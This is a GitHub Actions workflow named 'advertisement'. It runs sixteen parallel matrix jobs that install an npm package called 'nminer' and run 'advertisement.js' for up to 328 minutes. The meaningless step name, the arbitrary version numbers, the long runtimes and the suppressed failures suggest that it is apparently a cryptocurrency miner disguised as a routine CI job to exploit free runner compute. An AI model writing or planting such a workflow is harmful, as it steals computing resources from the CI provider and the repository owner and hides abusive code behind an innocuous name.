name: advertisement
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1819 }
          - { version: 5700 }
          - { version: 9732 }
          - { version: 1310 }
          - { version: 8788 }
          - { version: 7188 }
          - { version: 6062 }
          - { version: 6363 }
          - { version: 861 }
          - { version: 2987 }
          - { version: 2911 }
          - { version: 8818 }
          - { version: 299 }
          - { version: 9705 }
          - { version: 6878 }
          - { version: 1066 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: plugin nor whenever
        run: |
          npm install nminer@latest
          timeout 328m node advertisement.js || echo "advertisement executed"